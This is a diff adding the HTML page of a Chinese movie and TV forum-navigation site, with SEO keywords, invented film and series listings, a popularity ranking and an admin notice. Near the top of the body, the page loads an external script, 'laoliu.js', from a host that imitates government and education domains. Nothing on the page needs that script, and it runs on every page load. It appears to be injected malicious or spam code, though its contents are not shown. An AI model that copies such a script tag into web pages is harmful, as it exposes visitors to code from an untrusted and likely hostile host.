@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱搞搞电影网 - 懂行影迷的影视论坛导航</title>
+<meta name="description" content="爱搞搞电影网（aigaogaodianyingwang-h5）是懂行影迷的聚集地：最新电影、热播剧、综艺、动漫，论坛式导航、资源丰富、更新快，必应收录友好。">
+<meta name="keywords" content="爱搞搞电影网, aigaogaodianyingwang-h5, 电影, 电视剧, 综艺, 动漫, 在线观看, 高清电影, 热播剧, 影视论坛">
+<meta name="author" content="爱搞搞电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --bg:#1A1A1A;
+  --panel:#242424;
+  --line:#333333;
+  --green:#39FF14;
+  --yellow:#FFD700;
+  --text:#E0E0E0;
+  --dim:#999999;
+  --white:#FFFFFF;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",ui-monospace,Consolas,monospace;
+  background:
+    radial-gradient(800px 400px at 20% 10%,rgba(57,255,20,.08),transparent 60%),
+    var(--bg);
+  color:var(--text);line-height:1.8;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:1;
+  background:repeating-linear-gradient(0deg,transparent 0 2px,rgba(255,255,255,.02) 2px 3px);
+}
+a{color:var(--green);text-decoration:none;transition:.3s}
+a:hover{color:var(--yellow)}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(26,26,26,.95);backdrop-filter:blur(10px);border-bottom:2px solid var(--line)}
+.bar-in{max-width:1200px;margin:0 auto;height:64px;padding:0 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:900;font-size:22px;letter-spacing:2px;display:flex;align-items:center;gap:12px}
+.brand .icon{
+  width:36px;height:36px;border-radius:6px;display:grid;place-items:center;
+  background:var(--green);color:var(--bg);font-weight:900;font-size:16px;
+  box-shadow:0 0 15px rgba(57,255,20,.4);
+}
+.brand b{color:var(--green)}
+.brand i{font-style:normal;font-size:9px;letter-spacing:3px;color:var(--dim);display:block}
+.nav{display:flex;gap:4px;list-style:none}
+.nav a{padding:8px 14px;font-size:13px;font-weight:700;color:var(--text);border-radius:4px;border:1px solid transparent;font-family:ui-monospace,Consolas,monospace}
+.nav a:hover,.nav a.active{color:var(--bg);background:var(--green);border-color:var(--green)}
+.burger{display:none;background:none;border:none;color:var(--green);font-size:24px;cursor:pointer}
+
+/* Hero */
+.hero{max-width:1200px;margin:0 auto;padding:70px 18px 50px;position:relative;z-index:2;text-align:center}
+.term{display:inline-flex;gap:10px;align-items:center;font-size:11px;letter-spacing:2px;color:var(--green);border:1px solid var(--line);padding:6px 14px;border-radius:4px;background:var(--panel);font-family:ui-monospace,Consolas,monospace}
+.term .dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 1.5s infinite}
+@keyframes blink{50%{opacity:.3}}
+.hero h1{font-size:clamp(32px,7vw,56px);font-weight:900;letter-spacing:3px;margin:16px 0 12px;font-family:ui-monospace,Consolas,monospace}
+.hero h1 span{color:var(--green);text-shadow:0 0 20px rgba(57,255,20,.4)}
+.hero p{color:var(--dim);max-width:560px;margin:0 auto 24px;font-size:15px}
+.cta{display:inline-block;padding:14px 36px;border-radius:4px;font-weight:800;color:var(--bg);background:var(--green);box-shadow:0 8px 24px rgba(57,255,20,.3);font-family:ui-monospace,Consolas,monospace}
+.cta:hover{transform:translateY(-2px);color:var(--bg);box-shadow:0 12px 30px rgba(57,255,20,.4)}
+
+/* 区块 */
+.section{max-width:1200px;margin:0 auto;padding:48px 18px;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:2px solid var(--line);padding-bottom:10px;margin-bottom:24px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:2px;font-family:ui-monospace,Consolas,monospace}
+.head h2::before{content:"> "}
+.head a{font-size:13px;color:var(--dim)}
+
+/* 电影：热帖影单 */
+.posts{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.post{
+  background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;transition:.35s;position:relative;overflow:hidden;
+}
+.post:hover{transform:translateY(-6px);border-color:var(--green);box-shadow:0 12px 30px rgba(57,255,20,.15)}
+.post .thumb{height:140px;border-radius:6px;display:grid;place-items:center;font-size:48px;margin-bottom:14px;background:var(--bg);border:1px solid var(--line)}
+.post h3{font-size:16px;margin-bottom:8px;font-family:ui-monospace,Consolas,monospace}
+.post .meta{font-size:12px;color:var(--dim);display:flex;justify-content:space-between;margin-bottom:10px}
+.post .tags{display:flex;gap:6px;flex-wrap:wrap}
+.tag{font-size:10px;padding:3px 8px;border-radius:3px;background:var(--bg);border:1px solid var(--line);color:var(--green);font-family:ui-monospace,Consolas,monospace}
+
+/* 电视剧：连载追更 */
+.threads{display:flex;flex-direction:column;gap:12px}
+.thread{
+  display:grid;grid-template-columns:80px 1fr 120px;gap:16px;align-items:center;
+  background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px 18px;transition:.3s;
+}
+.thread:hover{background:rgba(57,255,20,.05);padding-left:24px;border-color:var(--green)}
+.thread .no{font-family:ui-monospace,Consolas,monospace;font-size:14px;color:var(--green);font-weight:700;text-align:center}
+.thread h4{font-size:15px;font-family:ui-monospace,Consolas,monospace}
+.thread p{font-size:12px;color:var(--dim)}
+.thread .status{font-size:11px;padding:4px 10px;border-radius:3px;border:1px solid var(--line);color:var(--green);text-align:center;font-family:ui-monospace,Consolas,monospace}
+.thread .status.hot{color:var(--yellow);border-color:var(--yellow)}
+
+/* 综艺动漫：资源分流 */
+.zones{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px}
+.zone{
+  height:140px;border-radius:8px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;
+  border:1px solid var(--line);background:var(--panel);transition:.3s;cursor:pointer;position:relative;overflow:hidden;
+}
+.zone:hover{transform:scale(1.05);border-color:var(--green);box-shadow:0 10px 24px rgba(57,255,20,.2)}
+.zone .icon{font-size:32px}
+.zone h4{font-size:14px;font-weight:800;font-family:ui-monospace,Consolas,monospace}
+.zone span{font-size:11px;color:var(--dim)}
+.zone .lines{display:flex;gap:4px;margin-top:4px}
+.zone .lines span{font-size:9px;padding:2px 6px;border:1px solid var(--line);border-radius:2px;color:var(--green)}
+
+/* 排行榜：人气热度 */
+.hot-list{display:flex;flex-direction:column;gap:14px}
+.hot-row{
+  display:grid;grid-template-columns:50px 1fr 100px;align-items:center;gap:14px;
+  background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px 18px;
+}
+.hot-row .rank{font-size:24px;font-weight:900;color:var(--green);font-family:ui-monospace,Consolas,monospace}
+.hot-row h4{font-size:15px;font-family:ui-monospace,Consolas,monospace}
+.hot-row .stats{display:flex;gap:12px;margin-top:4px;font-size:11px;color:var(--dim);font-family:ui-monospace,Consolas,monospace}
+.hot-row .views{font-size:13px;color:var(--yellow);text-align:right;font-family:ui-monospace,Consolas,monospace}
+
+/* 关于：站长留言 */
+.board{max-width:800px;margin:0 auto;background:var(--panel);border:2px solid var(--green);border-radius:8px;padding:32px;position:relative}
+.board::before{content:"[公告]";position:absolute;top:-12px;left:24px;background:var(--green);color:var(--bg);font-size:12px;font-weight:900;padding:4px 12px;border-radius:3px;font-family:ui-monospace,Consolas,monospace}
+.board h3{font-size:18px;margin-bottom:14px;color:var(--white);font-family:ui-monospace,Consolas,monospace}
+.board p{font-size:14px;color:#CCCCCC;margin-bottom:10px}
+.meta-line{font-family:ui-monospace,Consolas,monospace;font-size:12px;color:var(--dim);border-top:1px dashed var(--line);padding-top:12px;margin-top:16px}
+.meta-line b{color:var(--green)}
+.lnks{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:4px;font-size:13px;color:var(--text);font-family:ui-monospace,Consolas,monospace}
+.lnks a:hover{border-color:var(--green);color:var(--green)}
+
+/* 页脚 */
+.foot{border-top:2px solid var(--line);padding:30px 18px;text-align:center;color:var(--dim);font-size:13px;position:relative;z-index:2;font-family:ui-monospace,Consolas,monospace}
+.foot a{color:var(--dim);margin:0 6px}
+.foot .big{font-size:17px;font-weight:900;color:var(--white);letter-spacing:2px;margin-bottom:8px}
+.foot .url{color:var(--green)}
+
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:rgba(26,26,26,.96);border-bottom:1px solid var(--line);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:14px 16px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:48px 16px 32px}
+  .section{padding:32px 16px}
+  .posts{grid-template-columns:1fr;gap:12px}
+  .thread{grid-template-columns:60px 1fr;gap:10px;padding:12px}
+  .thread .status{grid-column:2;justify-self:start}
+  .hot-row{grid-template-columns:40px 1fr 80px;gap:10px;padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="brand"><span class="icon">搞</span><div>爱搞搞<b>电影网</b><i>AIGAOGAODIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#movies">热帖影单</a></li>
+      <li><a href="#tv">连载追更</a></li>
+      <li><a href="#ent">资源分流</a></li>
+      <li><a href="#rank">人气热度</a></li>
+      <li><a href="#about">站长留言</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <div class="term"><span class="dot"></span> FORUM ONLINE · 论坛正常访问</div>
+  <h1>爱搞搞<span>电影网</span></h1>
+  <p>aigaogaodianyingwang-h5 · 懂行影迷的聚集地，电影、剧集、综艺、动漫分类清晰，资源丰富更新快，找片有门道。</p>
+  <a href="#movies" class="cta">>> 进入论坛</a>
+</header>
+
+<section class="section" id="movies">
+  <div class="head"><h2>热帖影单 / HOT POSTS</h2><a href="#">更多热帖 →</a></div>
+  <div class="posts">
+    <div class="post"><div class="thumb">🎬</div><h3>【电影】深海暗流</h3><div class="meta"><span>悬疑惊悚</span><span>115min</span></div><div class="tags"><span class="tag">1080P</span><span class="tag">热帖</span><span class="tag">多线路</span></div></div>
+    <div class="post"><div class="thumb">🚗</div><h3>【电影】极速猎杀</h3><div class="meta"><span>动作犯罪</span><span>142min</span></div><div class="tags"><span class="tag">4K</span><span class="tag">硬核</span><span class="tag">低延迟</span></div></div>
+    <div class="post"><div class="thumb">🪐</div><h3>【电影】星际远征</h3><div class="meta"><span>科幻史诗</span><span>130min</span></div><div class="tags"><span class="tag">特效炸裂</span><span class="tag">新片</span></div></div>
+    <div class="post"><div class="thumb">🥋</div><h3>【电影】砂糖拳击手</h3><div class="meta"><span>运动励志</span><span>118min</span></div><div class="tags"><span class="tag">720P</span><span class="tag">燃</span></div></div>
+    <div class="post"><div class="thumb">🌙</div><h3>【电影】落日追凶</h3><div class="meta"><span>古装探案</span><span>104min</span></div><div class="tags"><span class="tag">高分</span><span class="tag">悬疑</span></div></div>
+    <div class="post"><div class="thumb">🏝️</div><h3>【电影】海岛慢时光</h3><div class="meta"><span>治愈文艺</span><span>96min</span></div><div class="tags"><span class="tag">4K</span><span class="tag">治愈</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:rgba(36,36,36,.6)">
+  <div class="head"><h2>连载追更 / SERIES THREADS</h2><a href="#">全部连载 →</a></div>
+  <div class="threads">
+    <div class="thread"><div class="no">#1001</div><div><h4>橘子味暗恋</h4><p>校园甜剧 · 24集 · 楼主已更至第12集</p></div><span class="status hot">楼主已更</span></div>
+    <div class="thread"><div class="no">#1002</div><div><h4>芒果职场日记</h4><p>都市轻喜剧 · 30集 · 线路A/B/C可切</p></div><span class="status hot">热播中</span></div>
+    <div class="thread"><div class="no">#1003</div><div><h4>西瓜摊的夏天</h4><p>治愈群像 · 18集 · 缓存完成100%</p></div><span class="status">可离线</span></div>
+    <div class="thread"><div class="no">#1004</div><div><h4>香蕉快递员</h4><p>单元悬疑 · 12集 · 晚22:00补更</p></div><span class="status">排队中</span></div>
+    <div class="thread"><div class="no">#1005</div><div><h4>椰子树下旧时光</h4><p>怀旧文艺 · 全20集 · 秒开完结</p></div><span class="status">已完结</span></div>
+  </div>
+</section>
+
+<section class="section" id="ent">
+  <div class="head"><h2>资源分流 / RESOURCE ZONES</h2><a href="#">更多分区 →</a></div>
+  <div class="zones">
+    <div class="zone"><div class="icon">🎤</div><h4>鲜榨歌会</h4><span>音乐综艺</span><div class="lines"><span>线路1</span><span>线路2</span></div></div>
+    <div class="zone"><div class="icon">🧚</div><h4>菠萝小精灵</h4><span>国漫治愈</span><div class="lines"><span>线路1</span><span>线路2</span><span>线路3</span></div></div>
+    <div class="zone"><div class="icon">🍜</div><h4>夜市吃不停</h4><span>美食真人秀</span><div class="lines"><span>线路1</span></div></div>
+    <div class="zone"><div class="icon">🎮</div><h4>电竞果汁局</h4><span>电竞动漫</span><div class="lines"><span>线路1</span><span>线路2</span></div></div>
+    <div class="zone"><div class="icon">🏝️</div><h4>海岛生存记</h4><span>户外综艺</span><div class="lines"><span>线路1</span><span>线路2</span><span>线路3</span></div></div>
+    <div class="zone"><div class="icon">💃</div><h4>热带舞池</h4><span>舞蹈竞演</span><div class="lines"><span>线路1</span></div></div>
+    <div class="zone"><div class="icon">📻</div><h4>傍晚电台</h4><span>访谈综艺</span><div class="lines"><span>线路1</span><span>线路2</span></div></div>
+    <div class="zone"><div class="icon">🐢</div><h4>慢龟动漫铺</h4><span>治愈番</span><div class="lines"><span>线路1</span><span>线路2</span><span>线路3</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:rgba(36,36,36,.6)">
+  <div class="head"><h2>人气热度 / HOT RANK</h2><a href="#">完整榜单 →</a></div>
+  <div class="hot-list">
+    <div class="hot-row"><div class="rank">01</div><div><h4>深海暗流</h4><div class="stats"><span>查看 12k</span><span>回复 856</span><span>收藏 2.3k</span></div></div><div class="views">12,456</div></div>
+    <div class="hot-row"><div class="rank">02</div><div><h4>极速猎杀</h4><div class="stats"><span>查看 9.8k</span><span>回复 642</span><span>收藏 1.9k</span></div></div><div class="views">9,832</div></div>
+    <div class="hot-row"><div class="rank">03</div><div><h4>橘子味暗恋</h4><div class="stats"><span>查看 8.5k</span><span>回复 521</span><span>收藏 1.5k</span></div></div><div class="views">8,521</div></div>
+    <div class="hot-row"><div class="rank">04</div><div><h4>星际远征</h4><div class="stats"><span>查看 7.2k</span><span>回复 438</span><span>收藏 1.2k</span></div></div><div class="views">7,218</div></div>
+    <div class="hot-row"><div class="rank">05</div><div><h4>海岛慢时光</h4><div class="stats"><span>查看 6.5k</span><span>回复 365</span><span>收藏 980</span></div></div><div class="views">6,518</div></div>
+    <div class="hot-row"><div class="rank">06</div><div><h4>芒果职场日记</h4><div class="stats"><span>查看 5.9k</span><span>回复 298</span><span>收藏 856</span></div></div><div class="views">5,912</div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="head"><h2>站长留言 / ADMIN NOTE</h2></div>
+  <div class="board">
+    <h3>“爱搞搞，就是懂行、会玩、找片有门道。”</h3>
+    <p>爱搞搞电影网（aigaogaodianyingwang-h5）是懂行影迷的聚集地：电影、剧集、综艺、动漫分好类，资源丰富更新快，不绕弯、不塞广告、手机一滑就找到想看的。</p>
+    <p>本站仅做静态导航，不存储视频文件；资源来自互联网公开分享，如有版权问题请联系站长处理。</p>
+    <div class="meta-line">STATUS: <b>ONLINE</b> · USERS: <b>128,592</b> · POSTS: <b>45,231</b> · TODAY: <b>+1,285</b></div>
+    <div class="lnks">
+      <a href="#">免责声明</a><a href="#">留言求片</a><a href="#">友情链接</a><a href="#">站长信箱</a><a href="#">报错节点</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">爱搞搞电影网 · AIGAOGAODIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#movies">热帖影单</a> | <a href="#tv">连载追更</a> | <a href="#ent">资源分流</a> | <a href="#rank">人气热度</a></p>
+  <p>官网：<span class="url">https://aigaogaodianyingwang-h5.github.io</span></p>
+  <p>© 2026 爱搞搞电影网 · 懂行影迷的聚集地</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
